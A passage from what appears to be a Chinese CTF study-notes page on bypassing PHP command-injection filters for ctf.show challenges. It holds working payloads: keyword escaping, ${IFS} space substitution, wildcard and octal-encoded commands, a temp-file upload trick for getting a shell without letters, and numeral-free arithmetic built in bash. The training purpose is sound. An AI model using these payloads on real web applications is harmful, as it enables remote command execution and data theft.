data-num="10"></td><td><pre>    </pre></td></tr><tr><td data-num="11"></td><td><pre>c<span class="token operator">=</span>t\ac<span class="token operator">&lt;</span>fla\g<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span> <span class="token comment">#tac 被过滤，在 tac 中插入转义字符 \</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    </pre></td></tr><tr><td data-num="13"></td><td><pre>c<span class="token operator">=</span><span class="token class-name class-name-fully-qualified type-declaration">t<span class="token punctuation">\</span>ac</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span>fla\g<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span>  <span class="token comment">#过滤了 `&lt;` 和 `>`，空格只能用其他的来代替，若没有过滤 `$` 和 `&#123;&#125;`，因此可以通过 `$&#123;IFS&#125;` 来绕过</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    </pre></td></tr><tr><td data-num="15"></td><td><pre>c<span class="token operator">=</span><span class="token class-name type-declaration">find</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span><span class="token operator">/</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span><span class="token operator">-</span><span class="token class-name type-declaration">name</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span><span class="token class-name class-name-fully-qualified">fla<span class="token punctuation">\</span>g</span><span class="token operator">||</span> <span class="token comment">#find /-name 文件名  ，从根目录开始查找含有 flag 的路径</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    </pre></td></tr><tr><td data-num="17"></td><td><pre>c<span class="token operator">=</span><span class="token class-name class-name-fully-qualified type-declaration">t<span class="token punctuation">\</span>ac</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span><span class="token operator">/</span><span class="token class-name class-name-fully-qualified">fla<span class="token punctuation">\</span>g</span><span class="token operator">||</span>   <span class="token comment">#相当于 c=tac /flag  【注意：flag 与 / 不能隔开】，查看根目录的 flag</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    </pre></td></tr><tr><td data-num="19"></td><td><pre>c<span class="token operator">=</span>ta<span class="token string single-quoted-string">''</span><span class="token class-name type-declaration">c</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span>fla<span class="token string single-quoted-string">''</span>g<span class="token operator">.</span>php  <span class="token comment">#把 \ 换成 ''(两个单引号) 也行</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    </pre></td></tr><tr><td data-num="21"></td><td><pre>c<span class="token operator">=</span><span class="token class-name type-declaration">mv</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span>fla<span class="token operator">?</span><span class="token operator">.</span><span class="token class-name type-declaration">php</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span>a<span class="token operator">.</span>txt <span class="token comment">#mv 命令把 flag 文件重命名，再使用 uniq 查看 a.txt</span></pre></td></tr><tr><td data-num="22"></td><td><pre>c<span class="token operator">=</span>uniq<span class="token punctuation">,</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span>a<span class="token operator">.</span>txt <span class="token comment">#用 uniq 查看 a.txt 文件，在源代码中</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    </pre></td></tr><tr><td data-num="24"></td><td><pre>【注意：有时候<span class="token operator">?</span>个数太少也无法绕过，可能是因为<span class="token string backtick-quoted-string">`.*`</span>把它匹配上了吧，所以下面才用了多个<span class="token string backtick-quoted-string">`?`</span>】    </pre></td></tr><tr><td data-num="25"></td><td><pre>c<span class="token operator">=</span><span class="token operator">/</span>bin<span class="token operator">/</span>ca<span class="token operator">?</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span><span class="token operator">??</span><span class="token operator">??</span><span class="token operator">.</span><span class="token operator">??</span><span class="token operator">?</span>   <span class="token comment">#利用？匹配命令需要写出全路径才能唯一确定命令，如：cat，与 /bin/ca? 匹配的，只有 /bin/cat 命令；【tac 貌似不再 bin 路径下，/bin/ta? 找不到】</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    </pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span>$<span class="token string single-quoted-string">'\143\141\164'</span><span class="token operator">%</span><span class="token number">20</span>$<span class="token string single-quoted-string">'\146'</span><span class="token operator">*</span>  <span class="token comment">#相当于？c=cat f*；如：\143 是 ASCII 码，表示字符 'c'，而 $ 可能是防止转义</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    </pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span><span class="token operator">/</span><span class="token operator">??</span><span class="token operator">?</span><span class="token operator">/</span><span class="token operator">??</span><span class="token operator">??</span><span class="token number">64</span> <span class="token operator">??</span><span class="token operator">??</span><span class="token operator">.</span><span class="token operator">??</span><span class="token operator">?</span>   <span class="token comment">#	即 /bin/base64 flag.php，base64 这个命令就是将指定的文件的内容以 base64 加密的形式输出。这个不是通用的，因为 base64 不是每个机器都有</span></pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span><span class="token operator">/</span><span class="token operator">??</span><span class="token operator">?</span><span class="token operator">/</span><span class="token operator">??</span><span class="token operator">?</span><span class="token operator">/</span><span class="token operator">??</span><span class="token operator">??</span><span class="token number">2</span> <span class="token operator">??</span><span class="token operator">??</span><span class="token operator">.</span><span class="token operator">??</span><span class="token operator">?</span>  <span class="token comment"># 即 /usr/bin/bzip2 flag.php，把 flag.php 给压缩，然后访问 url+flag.php.bz2 就可以把压缩后的 flag.php 给下载下来</span></pre></td></tr></table></figure><h3 id="无字母数字webshell无数字-字母命令执行有system但过滤数字和字母"><a class="anchor" href="#无字母数字webshell无数字-字母命令执行有system但过滤数字和字母">#</a> 无字母数字 webshell（无数字、字母命令执行【有 system 但过滤数字和字母】）</h3>
<h4 id="1利用方法"><a class="anchor" href="#1利用方法">#</a> 1. 利用方法:</h4>
<p>（在 ctftools / 无字母数字命令执行上传文件.html）【用 http，修改 url 后打开网页上传文件】</p>
<p>【注意是仍然 get 方式提交后面的 payload】</p>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">&lt;!-- 构造一个 post 上传文件的数据包，这是个上传页面，选择文件上传 --></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>POST数据包POC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://f2ef59eb-65f2-45f1-ba08-9e5def4312f5.chall.ctf.show/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment">&lt;!-- 链接是当前打开的题目链接 --></span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>文件名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p>上传文件【不能直接提交，要抓包，<strong>提交文件和 payload 是一起进行的</strong>】：</p>
<p>&lt;img src=&quot;<span class="exturl" data-url="aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTA5MTMzMDIwNjA0LnBuZw==">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250109133020604.png</span>&quot; alt=&quot;image-20250109133020604&quot; style=&quot;zoom:80%;&quot; /&gt;</p>
<p>抓包：</p>
<p>&lt;img src=&quot;<span class="exturl" data-url="aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTA5MTMzMjU1MTYwLnBuZw==">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250109133255160.png</span>&quot; alt=&quot;image-20250109133255160&quot; style=&quot;zoom:80%;&quot; /&gt;</p>
<p>POST 后加入 payload【get 方式】： <code>?c=.+/???/????????[@-[]</code> 【有可能最后一个字母不是大写，所以要多提交几次】</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span><span class="token operator">.</span><span class="token operator">+</span><span class="token operator">/</span><span class="token operator">??</span><span class="token operator">?</span><span class="token operator">/</span><span class="token operator">??</span><span class="token operator">??</span><span class="token operator">??</span><span class="token operator">??</span><span class="token punctuation">[</span>@<span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">#后面是 8 个？和 [@-[],[@-[] 代表一个大写字母，总共 9 个字母，php+6 个字母 (共九个)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span><span class="token operator">.</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">/</span><span class="token operator">??</span><span class="token operator">?</span><span class="token operator">/</span><span class="token operator">??</span><span class="token operator">??</span><span class="token operator">??</span><span class="token operator">??</span><span class="token punctuation">[</span>@<span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment">#也可以</span></pre></td></tr></table></figure><p><img data-src="https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250109133610734.png" alt="image-20250109133610734" /></p>
<p>看见是 <code>flag.php</code> ，在抓包中修改 <code>ls</code>  为 <code>cat flag.php</code> 【同样可能需要多提交几次才能出现 flag】</p>
<p><img data-src="https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250109133810106.png" alt="image-20250109133810106" /></p>
<h4 id="2原理"><a class="anchor" href="#2原理">#</a> 2. 原理：</h4>
<p>对 Linux shell 可以通过 <code>.</code>  filename 【 <code>.</code>  空格 <code>文件名</code> 】用 bash 来执行文件中的命令</p>
<p><code>.</code> : 用当前的 shell 执行一个文件中的命令，比如，当前运行的 shell 是 bash，则 <code>. file</code>  的意思就是用 bash 执行 file 文件中的命令【 <code>. file</code>  执行文件，是不需要 file 有 x 权限的】</p>
<p>因此要上传一个文件，通过在文件里的命令来 <code>get shell</code> ，因此只要能上传一个文件就能 getshell</p>
<p><strong>上传文件：</strong></p>
<ol>
<li>可以发送一个上传文件的 POST 包，此时 PHP 会将我们上传的文件保存在临时文件夹下</li>
<li>上传默认的文件名是 <code>/tmp/phpXXXXXX</code> 【与我们自己的文件名无关】，文件名最后 6 个字符是 <code>随机的大小写字母</code> 【加上 php 共 9 个字母】</li>
</ol>
<p><strong>构造 payload:</strong></p>
<p>由于要执行 <code>. file</code> ，我们需要通过通配符来正确执行我们上传的文件【因为执行 <code>. /tmp/phpXXXXXX</code>  也有字母会被过滤】</p>
<ol>
<li><code>*</code>  可以代替 0 个及以上任意字符</li>
<li><code>?</code>  可以代表 1 个任意字符</li>
<li><code>[^x]</code>  的方法来表面 “对应的这个位置不是字符 x”(相当于筛选其他已知的文件名减少干扰，但是一开始很难知道有什么文件名)</li>
<li><code>[@-[]</code>  来表示对应的这个位置是大写字母：ascii 中大写字母位于 <code>@</code> 与 <code>[</code> 之间，可以利用如 <code>[0-9]</code>  来表示一个范围</li>
</ol>
<p>因此可以构造 payload：</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span><span class="token operator">.</span><span class="token operator">+</span><span class="token operator">/</span><span class="token operator">??</span><span class="token operator">?</span><span class="token operator">/</span><span class="token operator">??</span><span class="token operator">??</span><span class="token operator">??</span><span class="token operator">??</span><span class="token punctuation">[</span>@<span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span>   <span class="token comment">#原本为？c=. /tmp/php 随机文件名</span></pre></td></tr></table></figure><p><strong>要多提交几次，因为 php 生成临时文件名是随机的，最后一个字符不一定是大写字母</strong></p>
<h4 id="3构造出数字利用shell的功能"><a class="anchor" href="#3构造出数字利用shell的功能">#</a> 3. 构造出数字（利用 shell 的功能）</h4>
<ul>
<li>
<p><code>$(( )) </code> 作用：它是用来作整数运算的</p>
<p>例如:</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>$ <span class="token assign-left variable">a</span><span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span> <span class="token assign-left variable">b</span><span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">;</span> <span class="token assign-left variable">c</span><span class="token operator">=</span><span class="token number">2</span></pre></td></tr><tr><td data-num="2"></td><td><pre>$ <span class="token builtin class-name">echo</span> <span class="token variable"><span class="token variable">$((</span> a<span class="token operator">+</span>b<span class="token operator">*</span>c <span class="token variable">))</span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">19</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>$ <span class="token builtin class-name">echo</span> <span class="token variable"><span class="token variable">$((</span> <span class="token punctuation">(</span>a<span class="token operator">*</span>b<span class="token punctuation">)</span><span class="token operator">%</span>c<span class="token variable">))</span></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">1</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>在 <span class="token variable"><span class="token variable">$((</span> <span class="token variable">))</span></span> 中的变量名称，可于其前面加 $ 符号来替换，也可以不用，如：</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token variable"><span class="token variable">$((</span> $a <span class="token operator">+</span> $b <span class="token operator">*</span> $c<span class="token variable">))</span></span> 也可得到 <span class="token number">19</span> 的结果</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>单纯用 <span class="token variable"><span class="token punctuation">((</span> <span class="token punctuation">))</span></span> 也可重定义变量值</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token assign-left variable">a</span><span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span> <span class="token variable"><span class="token punctuation">((</span>a<span class="token operator">++</span><span class="token punctuation">))</span></span> 可将 <span class="token variable">$a</span> 重定义为 <span class="token number">6</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token assign-left variable">a</span><span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span> <span class="token assign-left variable">b</span><span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">;</span> <span class="token variable"><span class="token punctuation">((</span>a <span class="token operator">&lt;</span> b<span class="token punctuation">))</span></span> 会得到   <span class="token number">0</span> <span class="token punctuation">(</span>true<span class="token punctuation">)</span> 的返回值</pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token variable"><span class="token variable">$((</span>""<span class="token variable">))</span></span>值为0 <span class="token comment">#$&#123;_&#125;: 代表上一次命令执行的结果，之前没有命令返回或者执行，结果应该是空，与 "" 等价</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token variable"><span class="token variable">$((</span><span class="token punctuation">))</span>值为<span class="token number">0</span></pre></td></tr><tr><td data-num="17"></td><td><pre>$<span class="token punctuation">((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span>值为-1 <span class="token comment">#这里为 - 1，是由于上面 $(()) 值假设为 000 取反后：111，以补码形式解释真值为 `-1`(101, 按位取反末位 + 1, 第一个 1 是符号位)</span></pre></td></tr></table></figure></li>
</ul>
<p>可以通过 <code>$((&quot;&quot;))</code>  来构造出任意数字：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token variable"><span class="token variable">$((</span><span class="token punctuation">))</span>值为<span class="token number">0</span></pre></td></tr><tr><td data-num="2"></td><td><pre>$<span class="token punctuation">((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span>值为-1</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable"><span class="token variable">$((</span><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token punctuation">))</span> <span class="token comment">#$((-1-1))=-2</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span>$<span class="token punctuation">((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token punctuation">))</span><span class="token punctuation">))</span> <span class="token comment">#$((~-2))=1，即对 - 2 取反</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>加入得到36，可以有37个<span class="token variable"><span class="token variable">`</span><span class="token parameter variable">-1</span><span class="token variable">`</span></span>运算后再取反，</pre></td></tr><tr><td data-num="7"></td><td><pre>即在<span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span>里放入37个<span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span> <span class="token comment">#~ 后的 $(()) 是计算 37 个 - 1 的和，然后 $((~)) 就是计算取反</span></pre></td></tr></table></figure><p>脚本：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>get_reverse_number <span class="token operator">=</span> <span class="token string">"$((~$((&#123;&#125;))))"</span> <span class="token comment"># 取反操作</span></pre></td></tr><tr><td data-num="2"></td><td><pre>negative_one <span class="token operator">=</span> <span class="token string">"$((~$(())))"</span>		<span class="token comment"># -1</span></pre></td></tr><tr><td data-num="3"></td><td><pre>payload <span class="token operator">=</span> get_reverse_number<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>negative_one<span class="token operator">*</span><span class="token number">37</span><span class="token punctuation">)</span> <span class="token comment">#37 个 - 1, 再取反得到 36</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">#输出的直接就是已经取反后的结果 36</span></pre></td></tr><tr><td data-num="7"></td><td><pre>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token 